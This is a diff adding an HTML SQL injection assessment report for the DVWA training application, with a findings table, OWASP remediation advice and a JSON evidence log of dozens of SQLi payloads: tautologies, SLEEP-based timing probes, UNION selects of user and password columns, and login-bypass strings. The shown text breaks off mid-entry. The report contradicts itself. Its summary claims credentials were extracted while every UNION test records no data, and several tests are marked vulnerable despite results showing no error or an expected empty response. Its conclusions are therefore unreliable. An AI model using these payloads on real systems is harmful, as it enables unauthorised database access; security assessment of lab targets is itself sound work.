@@ -1,0 +1,4829 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQL Injection Test Report</title>
+    <style>
+        body { font-family: sans-serif; margin: 2em; }
+        h1, h2, h3 { color: #333; }
+        table { border-collapse: collapse; width: 100%; }
+        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
+        th { background-color: #f2f2f2; }
+        .code { background-color: #eee; padding: 1em; border-radius: 5px; white-space: pre-wrap; }
+    </style>
+</head>
+<body>
+    <h1>SQL Injection Test Report</h1>
+    
+    <section id="summary">
+        <h2>Executive Summary</h2>
+        <p>This assessment evaluated DVWA against OWASP OTG-INPVAL-005 SQL injection tests across LOW, MEDIUM, and HIGH security levels. 17 of 84 test cases demonstrated SQL injection vulnerabilities, indicating significant security risks. Testing successfully extracted sensitive data including table names (users) and user credentials (admin:5f4dcc3b...). All major SQL injection vectors were tested: error-based, boolean blind, time-based, UNION-based, and authentication bypass. Immediate remediation is recommended to prevent unauthorized data access and system compromise.</p>
+    </section>
+    
+    <section id="findings">
+        <h2>Findings</h2>
+        <table><tr><th>Vector Type</th><th>Security Level</th><th>Payload</th><th>Risk Rating</th><th>CVSS Vector</th></tr><tr><td>Error Based Sqli</td><td>LOW</td><td><code>1' OR 1=1...</code></td><td>High/High</td><td>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N</td></tr><tr><td>Error Based Sqli</td><td>LOW</td><td><code>1' AND 1=CONVERT(int, (SELECT @@version))--...</code></td><td>High/High</td><td>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N</td></tr><tr><td>Error Based Sqli</td><td>LOW</td><td><code>1' AND 1=CAST((SELECT table_name FROM information_...</code></td><td>High/High</td><td>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N</td></tr><tr><td>Error Based Sqli</td><td>LOW</td><td><code>' OR 1=1--...</code></td><td>High/High</td><td>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N</td></tr><tr><td>Error Based Sqli</td><td>LOW</td><td><code>1' OR 'a'='a...</code></td><td>High/High</td><td>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N</td></tr><tr><td>Boolean Blind Sqli</td><td>LOW</td><td><code>1' AND 'a'='a...</code></td><td>High/Medium</td><td>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</td></tr><tr><td>Boolean Blind Sqli</td><td>LOW</td><td><code>1' AND 1=2--...</code></td><td>High/Medium</td><td>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</td></tr><tr><td>Boolean Blind Sqli</td><td>LOW</td><td><code>1' AND 'a'='b...</code></td><td>High/Medium</td><td>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</td></tr><tr><td>Boolean Blind Sqli</td><td>LOW</td><td><code>1' OR 1=2--...</code></td><td>High/Medium</td><td>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</td></tr><tr><td>Boolean Blind Sqli</td><td>MEDIUM</td><td><code>1' AND 1=2--...</code></td><td>High/Medium</td><td>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</td></tr><tr><td>Boolean Blind Sqli</td><td>MEDIUM</td><td><code>1' AND 'a'='b...</code></td><td>High/Medium</td><td>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</td></tr><tr><td>Boolean Blind Sqli</td><td>MEDIUM</td><td><code>1' OR 1=2--...</code></td><td>High/Medium</td><td>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</td></tr><tr><td>Boolean Blind Sqli</td><td>HIGH</td><td><code>1' AND 1=2--...</code></td><td>High/Medium</td><td>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</td></tr><tr><td>Boolean Blind Sqli</td><td>HIGH</td><td><code>1' AND 'a'='b...</code></td><td>High/Medium</td><td>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</td></tr><tr><td>Boolean Blind Sqli</td><td>HIGH</td><td><code>1' OR 1=2--...</code></td><td>High/Medium</td><td>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</td></tr><tr><td>Authentication Bypass</td><td>LOW</td><td><code>' OR '1'='1...</code></td><td>High/High</td><td>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N</td></tr><tr><td>Authentication Bypass</td><td>LOW</td><td><code>admin' OR '1'='1...</code></td><td>High/High</td><td>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N</td></tr></table>
+    </section>
+    
+    <section id="remediation">
+        <h2>Remediation</h2>
+        <h3>Error Based Sqli</h3><p>Implement parameterized queries (prepared statements) and proper input validation. Use stored procedures where appropriate. Never concatenate user input directly into SQL queries. Reference: <a href='https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html'>OWASP SQL Injection Prevention Cheat Sheet</a></p><h3>Authentication Bypass</h3><p>Implement parameterized queries for authentication mechanisms. Use proper session management and multi-factor authentication. Validate all authentication parameters. Reference: <a href='https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html'>OWASP Authentication Cheat Sheet</a></p><h3>Boolean Blind Sqli</h3><p>Use parameterized queries with proper input validation. Implement least privilege access for database accounts. Consider using stored procedures and ORM frameworks. Reference: <a href='https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html'>OWASP SQL Injection Prevention Cheat Sheet</a></p>
+    </section>
+    
+    <section id="evidence">
+        <h2>Test Evidence (JSON)</h2>
+        <div class="code"><pre>[
+  {
+    "test_id": "ERROR_LOW_1",
+    "security_level": "low",
+    "vector": "error_based_sqli",
+    "payload": "1' OR 1=1",
+    "expected_result": "SQL error or data extraction",
+    "actual_result": "SQL error detected",
+    "response_time_ms": 99.84159469604492,
+    "screenshot_path": "",
+    "status": "vulnerable"
+  },
+  {
+    "test_id": "ERROR_LOW_2",
+    "security_level": "low",
+    "vector": "error_based_sqli",
+    "payload": "1' AND 1=CONVERT(int, (SELECT @@version))--",
+    "expected_result": "SQL error or data extraction",
+    "actual_result": "SQL error detected",
+    "response_time_ms": 48.79164695739746,
+    "screenshot_path": "",
+    "status": "vulnerable"
+  },
+  {
+    "test_id": "ERROR_LOW_3",
+    "security_level": "low",
+    "vector": "error_based_sqli",
+    "payload": "1' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--",
+    "expected_result": "SQL error or data extraction",
+    "actual_result": "SQL error detected",
+    "response_time_ms": 49.04627799987793,
+    "screenshot_path": "",
+    "status": "vulnerable"
+  },
+  {
+    "test_id": "ERROR_LOW_4",
+    "security_level": "low",
+    "vector": "error_based_sqli",
+    "payload": "' OR 1=1--",
+    "expected_result": "SQL error or data extraction",
+    "actual_result": "SQL error detected",
+    "response_time_ms": 43.807268142700195,
+    "screenshot_path": "",
+    "status": "vulnerable"
+  },
+  {
+    "test_id": "ERROR_LOW_5",
+    "security_level": "low",
+    "vector": "error_based_sqli",
+    "payload": "1' OR 'a'='a",
+    "expected_result": "SQL error or data extraction",
+    "actual_result": "No error detected",
+    "response_time_ms": 47.41311073303223,
+    "screenshot_path": "",
+    "status": "vulnerable"
+  },
+  {
+    "test_id": "BOOL_TRUE_LOW_1",
+    "security_level": "low",
+    "vector": "boolean_blind_sqli",
+    "payload": "1' AND 1=1--",
+    "expected_result": "Data returned (true condition)",
+    "actual_result": "No data returned",
+    "response_time_ms": 26.833057403564453,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "BOOL_TRUE_LOW_2",
+    "security_level": "low",
+    "vector": "boolean_blind_sqli",
+    "payload": "1' AND 'a'='a",
+    "expected_result": "Data returned (true condition)",
+    "actual_result": "Data returned",
+    "response_time_ms": 43.29252243041992,
+    "screenshot_path": "",
+    "status": "vulnerable"
+  },
+  {
+    "test_id": "BOOL_TRUE_LOW_3",
+    "security_level": "low",
+    "vector": "boolean_blind_sqli",
+    "payload": "1' OR 1=1--",
+    "expected_result": "Data returned (true condition)",
+    "actual_result": "No data returned",
+    "response_time_ms": 41.237592697143555,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "BOOL_FALSE_LOW_1",
+    "security_level": "low",
+    "vector": "boolean_blind_sqli",
+    "payload": "1' AND 1=2--",
+    "expected_result": "No data returned (false condition)",
+    "actual_result": "No data returned",
+    "response_time_ms": 45.42398452758789,
+    "screenshot_path": "",
+    "status": "vulnerable"
+  },
+  {
+    "test_id": "BOOL_FALSE_LOW_2",
+    "security_level": "low",
+    "vector": "boolean_blind_sqli",
+    "payload": "1' AND 'a'='b",
+    "expected_result": "No data returned (false condition)",
+    "actual_result": "No data returned",
+    "response_time_ms": 46.335458755493164,
+    "screenshot_path": "",
+    "status": "vulnerable"
+  },
+  {
+    "test_id": "BOOL_FALSE_LOW_3",
+    "security_level": "low",
+    "vector": "boolean_blind_sqli",
+    "payload": "1' OR 1=2--",
+    "expected_result": "No data returned (false condition)",
+    "actual_result": "No data returned",
+    "response_time_ms": 41.61882400512695,
+    "screenshot_path": "",
+    "status": "vulnerable"
+  },
+  {
+    "test_id": "TIME_LOW_1",
+    "security_level": "low",
+    "vector": "time_based_sqli",
+    "payload": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+    "expected_result": "Response delayed by 5 seconds",
+    "actual_result": "No significant delay",
+    "response_time_ms": 46.685218811035156,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "TIME_LOW_2",
+    "security_level": "low",
+    "vector": "time_based_sqli",
+    "payload": "1' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+    "expected_result": "Response delayed by 5 seconds",
+    "actual_result": "No significant delay",
+    "response_time_ms": 44.976234436035156,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "TIME_LOW_3",
+    "security_level": "low",
+    "vector": "time_based_sqli",
+    "payload": "1' AND IF(1=1, SLEEP(5), 0)--",
+    "expected_result": "Response delayed by 5 seconds",
+    "actual_result": "No significant delay",
+    "response_time_ms": 47.3017692565918,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "TIME_LOW_4",
+    "security_level": "low",
+    "vector": "time_based_sqli",
+    "payload": "1' AND IF(SUBSTRING(@@version,1,1)='5', SLEEP(5), 0)--",
+    "expected_result": "Response delayed by 5 seconds",
+    "actual_result": "No significant delay",
+    "response_time_ms": 46.66423797607422,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "UNION_LOW_1",
+    "security_level": "low",
+    "vector": "union_based_sqli",
+    "payload": "1' UNION SELECT 1,2--",
+    "expected_result": "Data extracted via UNION",
+    "actual_result": "No data extracted",
+    "response_time_ms": 46.45800590515137,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "UNION_LOW_2",
+    "security_level": "low",
+    "vector": "union_based_sqli",
+    "payload": "1' UNION SELECT database(),user()--",
+    "expected_result": "Data extracted via UNION",
+    "actual_result": "No data extracted",
+    "response_time_ms": 45.89247703552246,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "UNION_LOW_3",
+    "security_level": "low",
+    "vector": "union_based_sqli",
+    "payload": "1' UNION SELECT table_name,table_schema FROM information_schema.tables LIMIT 1--",
+    "expected_result": "Data extracted via UNION",
+    "actual_result": "No data extracted",
+    "response_time_ms": 46.37002944946289,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "UNION_LOW_4",
+    "security_level": "low",
+    "vector": "union_based_sqli",
+    "payload": "1' UNION SELECT user,password FROM users LIMIT 1--",
+    "expected_result": "Data extracted via UNION",
+    "actual_result": "No data extracted",
+    "response_time_ms": 33.01739692687988,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "UNION_LOW_5",
+    "security_level": "low",
+    "vector": "union_based_sqli",
+    "payload": "1' UNION SELECT user,password FROM dvwa.users LIMIT 1--",
+    "expected_result": "Data extracted via UNION",
+    "actual_result": "No data extracted",
+    "response_time_ms": 45.43590545654297,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "AUTH_BYPASS_LOW_1",
+    "security_level": "low",
+    "vector": "authentication_bypass",
+    "payload": "admin'--",
+    "expected_result": "Authentication bypass successful",
+    "actual_result": "Bypass failed",
+    "response_time_ms": 46.34404182434082,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "AUTH_BYPASS_LOW_2",
+    "security_level": "low",
+    "vector": "authentication_bypass",
+    "payload": "admin' #",
+    "expected_result": "Authentication bypass successful",
+    "actual_result": "Bypass failed",
+    "response_time_ms": 46.50425910949707,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "AUTH_BYPASS_LOW_3",
+    "security_level": "low",
+    "vector": "authentication_bypass",
+    "payload": "admin'/*",
+    "expected_result": "Authentication bypass successful",
+    "actual_result": "Bypass failed",
+    "response_time_ms": 42.31905937194824,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "AUTH_BYPASS_LOW_4",
+    "security_level": "low",
+    "vector": "authentication_bypass",
+    "payload": "' OR 1=1--",
+    "expected_result": "Authentication bypass successful",
+    "actual_result": "Bypass failed",
+    "response_time_ms": 45.468807220458984,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "AUTH_BYPASS_LOW_5",
+    "security_level": "low",
+    "vector": "authentication_bypass",
+    "payload": "' OR '1'='1",
+    "expected_result": "Authentication bypass successful",
+    "actual_result": "Bypass successful",
+    "response_time_ms": 47.87135124206543,
+    "screenshot_path": "",
+    "status": "vulnerable"
+  },
+  {
+    "test_id": "AUTH_BYPASS_LOW_6",
+    "security_level": "low",
+    "vector": "authentication_bypass",
+    "payload": "' UNION SELECT 'admin','password'--",
+    "expected_result": "Authentication bypass successful",
+    "actual_result": "Bypass failed",
+    "response_time_ms": 41.647911071777344,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "AUTH_BYPASS_LOW_7",
+    "security_level": "low",
+    "vector": "authentication_bypass",
+    "payload": "admin' OR '1'='1",
+    "expected_result": "Authentication bypass successful",
+    "actual_result": "Bypass successful",
+    "response_time_ms": 45.86219787597656,
+    "screenshot_path": "",
+    "status": "vulnerable"
+  },
+  {
+    "test_id": "AUTH_BYPASS_LOW_8",
+    "security_level": "low",
+    "vector": "authentication_bypass",
+    "payload": "' OR username='admin",
+    "expected_result": "Authentication bypass successful",
+    "actual_result": "Bypass failed",
+    "response_time_ms": 42.783498764038086,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "ERROR_MEDIUM_1",
+    "security_level": "medium",
+    "vector": "error_based_sqli",
+    "payload": "1' OR 1=1",
+    "expected_result": "SQL error or data extraction",
+    "actual_result": "No error detected",
+    "response_time_ms": 86.456298828125,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "ERROR_MEDIUM_2",
+    "security_level": "medium",
+    "vector": "error_based_sqli",
+    "payload": "1' AND 1=CONVERT(int, (SELECT @@version))--",
+    "expected_result": "SQL error or data extraction",
+    "actual_result": "No error detected",
+    "response_time_ms": 34.40499305725098,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "ERROR_MEDIUM_3",
+    "security_level": "medium",
+    "vector": "error_based_sqli",
+    "payload": "1' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--",
+    "expected_result": "SQL error or data extraction",
+    "actual_result": "No error detected",
+    "response_time_ms": 42.10066795349121,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "ERROR_MEDIUM_4",
+    "security_level": "medium",
+    "vector": "error_based_sqli",
+    "payload": "' OR 1=1--",
+    "expected_result": "SQL error or data extraction",
+    "actual_result": "No error detected",
+    "response_time_ms": 43.673038482666016,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "ERROR_MEDIUM_5",
+    "security_level": "medium",
+    "vector": "error_based_sqli",
+    "payload": "1' OR 'a'='a",
+    "expected_result": "SQL error or data extraction",
+    "actual_result": "No error detected",
+    "response_time_ms": 42.28615760803223,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "BOOL_TRUE_MEDIUM_1",
+    "security_level": "medium",
+    "vector": "boolean_blind_sqli",
+    "payload": "1' AND 1=1--",
+    "expected_result": "Data returned (true condition)",
+    "actual_result": "No data returned",
+    "response_time_ms": 40.10176658630371,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "BOOL_TRUE_MEDIUM_2",
+    "security_level": "medium",
+    "vector": "boolean_blind_sqli",
+    "payload": "1' AND 'a'='a",
+    "expected_result": "Data returned (true condition)",
+    "actual_result": "No data returned",
+    "response_time_ms": 43.69068145751953,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "BOOL_TRUE_MEDIUM_3",
+    "security_level": "medium",
+    "vector": "boolean_blind_sqli",
+    "payload": "1' OR 1=1--",
+    "expected_result": "Data returned (true condition)",
+    "actual_result": "No data returned",
+    "response_time_ms": 42.26374626159668,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "BOOL_FALSE_MEDIUM_1",
+    "security_level": "medium",
+    "vector": "boolean_blind_sqli",
+    "payload": "1' AND 1=2--",
+    "expected_result": "No data returned (false condition)",
+    "actual_result": "No data returned",
+    "response_time_ms": 40.66872596740723,
+    "screenshot_path": "",
+    "status": "vulnerable"
+  },
+  {
+    "test_id": "BOOL_FALSE_MEDIUM_2",
+    "security_level": "medium",
+    "vector": "boolean_blind_sqli",
+    "payload": "1' AND 'a'='b",
+    "expected_result": "No data returned (false condition)",
+    "actual_result": "No data returned",
+    "response_time_ms": 41.34821891784668,
+    "screenshot_path": "",
+    "status": "vulnerable"
+  },
+  {
+    "test_id": "BOOL_FALSE_MEDIUM_3",
+    "security_level": "medium",
+    "vector": "boolean_blind_sqli",
+    "payload": "1' OR 1=2--",
+    "expected_result": "No data returned (false condition)",
+    "actual_result": "No data returned",
+    "response_time_ms": 41.81838035583496,
+    "screenshot_path": "",
+    "status": "vulnerable"
+  },
+  {
+    "test_id": "TIME_MEDIUM_1",
+    "security_level": "medium",
+    "vector": "time_based_sqli",
+    "payload": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+    "expected_result": "Response delayed by 5 seconds",
+    "actual_result": "No significant delay",
+    "response_time_ms": 41.88799858093262,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "TIME_MEDIUM_2",
+    "security_level": "medium",
+    "vector": "time_based_sqli",
+    "payload": "1' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+    "expected_result": "Response delayed by 5 seconds",
+    "actual_result": "No significant delay",
+    "response_time_ms": 47.16825485229492,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "TIME_MEDIUM_3",
+    "security_level": "medium",
+    "vector": "time_based_sqli",
+    "payload": "1' AND IF(1=1, SLEEP(5), 0)--",
+    "expected_result": "Response delayed by 5 seconds",
+    "actual_result": "No significant delay",
+    "response_time_ms": 45.899391174316406,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "TIME_MEDIUM_4",
+    "security_level": "medium",
+    "vector": "time_based_sqli",
+    "payload": "1' AND IF(SUBSTRING(@@version,1,1)='5', SLEEP(5), 0)--",
+    "expected_result": "Response delayed by 5 seconds",
+    "actual_result": "No significant delay",
+    "response_time_ms": 46.700477600097656,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "UNION_MEDIUM_1",
+    "security_level": "medium",
+    "vector": "union_based_sqli",
+    "payload": "1' UNION SELECT 1,2--",
+    "expected_result": "Data extracted via UNION",
+    "actual_result": "No data extracted",
+    "response_time_ms": 47.31154441833496,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "UNION_MEDIUM_2",
+    "security_level": "medium",
+    "vector": "union_based_sqli",
+    "payload": "1' UNION SELECT database(),user()--",
+    "expected_result": "Data extracted via UNION",
+    "actual_result": "No data extracted",
+    "response_time_ms": 42.94252395629883,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "UNION_MEDIUM_3",
+    "security_level": "medium",
+    "vector": "union_based_sqli",
+    "payload": "1' UNION SELECT table_name,table_schema FROM information_schema.tables LIMIT 1--",
+    "expected_result": "Data extracted via UNION",
+    "actual_result": "No data extracted",
+    "response_time_ms": 42.13881492614746,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "UNION_MEDIUM_4",
+    "security_level": "medium",
+    "vector": "union_based_sqli",
+    "payload": "1' UNION SELECT user,password FROM users LIMIT 1--",
+    "expected_result": "Data extracted via UNION",
+    "actual_result": "No data extracted",
+    "response_time_ms": 42.471885681152344,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "UNION_MEDIUM_5",
+    "security_level": "medium",
+    "vector": "union_based_sqli",
+    "payload": "1' UNION SELECT user,password FROM dvwa.users LIMIT 1--",
+    "expected_result": "Data extracted via UNION",
+    "actual_result": "No data extracted",
+    "response_time_ms": 42.1297550201416,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "AUTH_BYPASS_MEDIUM_1",
+    "security_level": "medium",
+    "vector": "authentication_bypass",
+    "payload": "admin'--",
+    "expected_result": "Authentication bypass successful",
+    "actual_result": "Bypass failed",
+    "response_time_ms": 42.830705642700195,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "AUTH_BYPASS_MEDIUM_2",
+    "security_level": "medium",
+    "vector": "authentication_bypass",
+    "payload": "admin' #",
+    "expected_result": "Authentication bypass successful",
+    "actual_result": "Bypass failed",
+    "response_time_ms": 42.4044132232666,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "AUTH_BYPASS_MEDIUM_3",
+    "security_level": "medium",
+    "vector": "authentication_bypass",
+    "payload": "admin'/*",
+    "expected_result": "Authentication bypass successful",
+    "actual_result": "Bypass failed",
+    "response_time_ms": 42.546987533569336,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "AUTH_BYPASS_MEDIUM_4",
+    "security_level": "medium",
+    "vector": "authentication_bypass",
+    "payload": "' OR 1=1--",
+    "expected_result": "Authentication bypass successful",
+    "actual_result": "Bypass failed",
+    "response_time_ms": 40.26508331298828,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "AUTH_BYPASS_MEDIUM_5",
+    "security_level": "medium",
+    "vector": "authentication_bypass",
+    "payload": "' OR '1'='1",
+    "expected_result": "Authentication bypass successful",
+    "actual_result": "Bypass failed",
+    "response_time_ms": 40.68112373352051,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "AUTH_BYPASS_MEDIUM_6",
+    "security_level": "medium",
+    "vector": "authentication_bypass",
+    "payload": "' UNION SELECT 'admin','password'--",
+    "expected_result": "Authentication bypass successful",
+    "actual_result": "Bypass failed",
+    "response_time_ms": 43.909311294555664,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "AUTH_BYPASS_MEDIUM_7",
+    "security_level": "medium",
+    "vector": "authentication_bypass",
+    "payload": "admin' OR '1'='1",
+    "expected_result": "Authentication bypass successful",
+    "actual_result": "Bypass failed",
+    "response_time_ms": 41.78261756896973,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "AUTH_BYPASS_MEDIUM_8",
+    "security_level": "medium",
+    "vector": "authentication_bypass",
+    "payload": "' OR username='admin",
+    "expected_result": "Authentication bypass successful",
+    "actual_result": "Bypass failed",
+    "response_time_ms": 43.86162757873535,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "ERROR_HIGH_1",
+    "security_level": "high",
+    "vector": "error_based_sqli",
+    "payload": "1' OR 1=1",
+    "expected_result": "SQL error or data extraction",
+    "actual_result": "No error detected",
+    "response_time_ms": 72.78656959533691,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "ERROR_HIGH_2",
+    "security_level": "high",
+    "vector": "error_based_sqli",
+    "payload": "1' AND 1=CONVERT(int, (SELECT @@version))--",
+    "expected_result": "SQL error or data extraction",
+    "actual_result": "No error detected",
+    "response_time_ms": 26.318073272705078,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "ERROR_HIGH_3",
+    "security_level": "high",
+    "vector": "error_based_sqli",
+    "payload": "1' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--",
+    "expected_result": "SQL error or data extraction",
+    "actual_result": "No error detected",
+    "response_time_ms": 42.39535331726074,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "ERROR_HIGH_4",
+    "security_level": "high",
+    "vector": "error_based_sqli",
+    "payload": "' OR 1=1--",
+    "expected_result": "SQL error or data extraction",
+    "actual_result": "No error detected",
+    "response_time_ms": 41.88966751098633,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "ERROR_HIGH_5",
+    "security_level": "high",
+    "vector": "error_based_sqli",
+    "payload": "1' OR 'a'='a",
+    "expected_result": "SQL error or data extraction",
+    "actual_result": "No error detected",
+    "response_time_ms": 43.2286262512207,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "BOOL_TRUE_HIGH_1",
+    "security_level": "high",
+    "vector": "boolean_blind_sqli",
+    "payload": "1' AND 1=1--",
+    "expected_result": "Data returned (true condition)",
+    "actual_result": "No data returned",
+    "response_time_ms": 42.497873306274414,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "BOOL_TRUE_HIGH_2",
+    "security_level": "high",
+    "vector": "boolean_blind_sqli",
+    "payload": "1' AND 'a'='a",
+    "expected_result": "Data returned (true condition)",
+    "actual_result": "No data returned",
+    "response_time_ms": 41.06330871582031,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "BOOL_TRUE_HIGH_3",
+    "security_level": "high",
+    "vector": "boolean_blind_sqli",
+    "payload": "1' OR 1=1--",
+    "expected_result": "Data returned (true condition)",
+    "actual_result": "No data returned",
+    "response_time_ms": 42.54293441772461,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "BOOL_FALSE_HIGH_1",
+    "security_level": "high",
+    "vector": "boolean_blind_sqli",
+    "payload": "1' AND 1=2--",
+    "expected_result": "No data returned (false condition)",
+    "actual_result": "No data returned",
+    "response_time_ms": 41.42427444458008,
+    "screenshot_path": "",
+    "status": "vulnerable"
+  },
+  {
+    "test_id": "BOOL_FALSE_HIGH_2",
+    "security_level": "high",
+    "vector": "boolean_blind_sqli",
+    "payload": "1' AND 'a'='b",
+    "expected_result": "No data returned (false condition)",
+    "actual_result": "No data returned",
+    "response_time_ms": 42.97065734863281,
+    "screenshot_path": "",
+    "status": "vulnerable"
+  },
+  {
+    "test_id": "BOOL_FALSE_HIGH_3",
+    "security_level": "high",
+    "vector": "boolean_blind_sqli",
+    "payload": "1' OR 1=2--",
+    "expected_result": "No data returned (false condition)",
+    "actual_result": "No data returned",
+    "response_time_ms": 42.487144470214844,
+    "screenshot_path": "",
+    "status": "vulnerable"
+  },
+  {
+    "test_id": "TIME_HIGH_1",
+    "security_level": "high",
+    "vector": "time_based_sqli",
+    "payload": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+    "expected_result": "Response delayed by 5 seconds",
+    "actual_result": "No significant delay",
+    "response_time_ms": 42.67692565917969,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "TIME_HIGH_2",
+    "security_level": "high",
+    "vector": "time_based_sqli",
+    "payload": "1' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+    "expected_result": "Response delayed by 5 seconds",
+    "actual_result": "No significant delay",
+    "response_time_ms": 47.14345932006836,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "TIME_HIGH_3",
+    "security_level": "high",
+    "vector": "time_based_sqli",
+    "payload": "1' AND IF(1=1, SLEEP(5), 0)--",
+    "expected_result": "Response delayed by 5 seconds",
+    "actual_result": "No significant delay",
+    "response_time_ms": 31.48055076599121,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "TIME_HIGH_4",
+    "security_level": "high",
+    "vector": "time_based_sqli",
+    "payload": "1' AND IF(SUBSTRING(@@version,1,1)='5', SLEEP(5), 0)--",
+    "expected_result": "Response delayed by 5 seconds",
+    "actual_result": "No significant delay",
